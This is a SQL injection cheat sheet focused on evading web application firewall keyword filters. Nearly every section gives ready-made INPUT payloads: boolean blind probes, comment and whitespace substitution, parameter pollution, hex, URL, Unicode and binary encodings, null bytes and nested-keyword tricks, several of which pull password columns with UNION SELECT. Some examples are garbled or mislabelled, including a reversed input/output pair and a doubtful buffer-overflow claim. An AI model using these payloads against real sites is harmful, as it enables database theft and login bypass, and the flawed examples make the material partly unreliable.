# BYPASSING COMMON SQL FILTERS

SQL injection is a type of injection where users can append an SQL query via the input and manipulate and extract sensitive information from the database and hence sacrificing the integrity of the application.

In applications prone to SQL injections, they tend to create a Web Application Firewall (WAF), that sanitize or blacklist the common SQL keywords in the input. SQL injection WAF is generally a security layer which follows a bunch of rules to prevent SQL injection. Most of the common filters applied by WAF are bypassable.


Lets look at the following example where the client gets to alter the two fields “username” and “password”
`select * from table_name where username = '{$ _ GET [username]}';`




## Blind SQL Injection (UNION Blacklist)
It uses the method of requesting true or false responses from the database using “AND” and “OR” to bruteforce the data. This can be used when the database does not give data as output.

INPUT: ?username='admin' OR length(username)>0#
OUTPUT: select * from table_name where username='admin' OR length(username)>0;
INPUT: ?username='admin' OR (ascii(substr(username,i,j))>0)#
OUTPUT: select * from table_name where username='admin' OR (ascii(substr(username,i,j))>0);

Correspondence: substring(), mid(), substr() ascii(), hex(), bin(), benchmark(), sleep(), like, ord(), find_in_set(), locate(), strcmp()

## Buffer Overflow bypassing

While writing into the buffer with huge values, surpass the buffer's boundary overwriting the memory of an application because most of the WAFs are written and compiled in C.

INPUT: ?username='admin' AND (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAA.....A)#
OUTPUT: select * from table_name where username='admin' AND (select 1)=(select 0xAAAAAAAAAAAAAAAAAAAAA.....A);

## CRLF  
CRLF-> Carriage Return, Line Feed. These control characters can be used to  substitute for spaces and comments. 

INPUT: ?username=’%0a’ OR username='admin'#
OUTPUT: select * from table_name where username=’’ OR username='admin'; 

## HTTP Parameter Pollution (HPP)
The parameters in the HTTP request is manipulated maliciously with different unintended methods to achieve sensitive information

## Query concatenation
INPUT: ?username =1/**/union/*,*/select/*,*/password/*,*/from/*,*/table_name#
OUTPUT: select * from table_name where username =1 union select password from table_name;


INPUT: ?1+union+select+password+from+table_name#
OUTPUT: select * from table_name where username =1 union select password from table_name;

INPUT: ?username =1/**/union/*&username=*/select/*&username=*/password/*&username=*/from/*&username=*/table_name#
OUTPUT: select * from table_name where username =1 union select password from table_name;


## Multiple parameters of same name are interpreted differently by different languages and frameworks
PHP/Apache:
Considers the last occurence

INPUT: ?username=guest&username=admin
 
-> JSP, Servlet, Apache Tomcat: Considers the first occurence
INPUT: ?username=admin&username=guest

-> ASP.NET/IIS: Combines the parameters
INPUT: ?username=ad&username=min

OUTPUT: select * from table_name where username =’admin’;


## Using Special characters
|, ?, “, ‘, *, %, £ , [], ;, :, \/, $, €, ()

Usually the WAF would consider these special characters as spaces or ignore them which lets us bypass various keywords being blacklisted.

INPUT: ?username =1+uni*on+sel*ect+password+fr*om+table_name#
OUTPUT: select * from table_name where username =1 union select password from table_name;

INPUT: ?username =1 union select password from table_name#
OUTPUT: select * from table_name where username =1+uni%on+sel%ect+password+fr%om+table_name;

INPUT: ?username =1+uni’’’on+sel’’’ect+password+fr’’’om+table_name#
OUTPUT: select * from table_name where username =1 union select password from table_name;

## Hex Encoding
When particular keywords are blacklisted, we could substitute with the hex encoded value because after the URL is parsed, it decodes it and turns the hex values to plain text.


INPUT: ?username = 1 %75%6e%69%6f%6e %73%65%6c%65%63%74 password %66%72%6f%6d table_name#
OUTPUT: select * from table_name where username = 1 union select password from table_name;

INPUT: ?username = 0x61646d696e#
OUTPUT: select * from table_name where username = admin;

## URL Encoding
Similar to hex encoding, by substituting hex values to all the blacklisted words and bypass it once the URL gets decoded.

INPUT: ?username = 1%2f%2a*/UNION%2fa%2a*/SELECT%2f%2a*/password%2f%2a*/FROM%2f%2a*/table_name#
OUTPUT: select * from table_name where username = 1/**/UNION/**/SELECT/**/password/**/FROM/**/table_name;

Here %2f=’/’ and %2a=’*’

INPUT: ?username =1+union%2bselect%2bpassword%2bfrom%2btable_name#
OUTPUT: select * from table_name where username =1 union select password from table_name;

Here %2b=’+’

INPUT: ?username = ‘admin’%23 
OUTPUT: select * from table_name where username = ‘admin’#and password=’’;

INPUT: ?username = ‘admin’%2d%2d 
OUTPUT: select * from table_name where username = ‘admin’-- and password=’’;

## Unicode Encoding
In this encoding standard, some of the characters can be used as a substitute for the ASCII values that are blacklisted and thus bypass it to dump the database.

INPUT: ?username =āďḾĩň#
OUTPUT: select * from table_name where username =’āďḾĩň’;
SELECT 'Ä'='A';

## Ascii substitute
These ASCII characters have multiple alternatives which has a different value but their functions would be similar and can be used to bypass blacklist.

Bypassing space blacklist
INPUT: select%09*%09from%09table_name%09where%09username=’admin’;
OUTPUT: select * from table_name where username=’admin’;
Correspondence: %0b(Vertical Tab), %0c(New Form), %09(Horizontal Tab), %0a(New Line) 

## Base Conversion
By representing values that are blacklisted in different bases would help bypass the filter

INPUT: ?username =0b0110000101100100011011010110100101101110
OUTPUT: select * from table_name where username =admin;

INPUT: ?username =0o141144155151156
OUTPUT: select * from table_name where username =admin;

## Null Byte Injection
When we provide a URL-encoded null byte (%00) before the string to be bypassed will remove everything after the null byte.

INPUT: ?username =’admin’;%00
OUTPUT: select * from table_name where username =’admin’;

## Changing Cases
The SQL Keywords are case-insensitive and hence when a WAF blocks a particular case of string, we can bypass it by giving varied cases. 

INPUT: seLEct * frOm table_name whErE username =’admin’;
OUTPUT: select * from table_name where username =’admin’;

INPUT: select * from table_name where username =’ADMIN’;
OUTPUT: select * from table_name where username =’ADMIN’;

## Replace Bypass
The WAFs that replace all the occurrences of particular keywords with  empty string can be bypassed by giving the keyword in the middle of the same key word and hence getting the same keyword after the WAF replaces the keyword in between

INPUT: select * from table_name where username =’admadminin’;
OUTPUT: select * from table_name where username =’admin’;

INPUT: ?1’ uniunionon select * from table_name where username=’admin’;
OUTPUT: select * from table_name where username =’1’ union select * from table_name where username=’admin’;


## Varied Comparison
In SQL, while selecting from the database, comparison of the conditions can be done with other methods other than ‘=’ and we can bypass the filters with these varied methods 

INPUT: select * from table_name where username =’’<1;%00
OUTPUT: Dumps whole table since 0(empty set)<1 = true

INPUT: select * from table_name where username =’’ union select username where username like a%;
OUTPUT: Would dump table where usernames that starts with ‘a’

INPUT: select * from table_name where username =’’ union select username where username like %m;
OUTPUT: Would dump all usernames that ends with ‘m’

INPUT:  select * from table_name where username =’’ union select username where username like %d%;
OUTPUT: Would dump all usernames that has ‘d’ in it


INPUT: ?username=admin' OR length(username)>0#
OUTPUT: select * from table_name where username='admin' OR length(username)>0;

INPUT: ?username=admin' OR length(username)!=0#
OUTPUT: select * from table_name where username='admin' OR length(username)!=0;



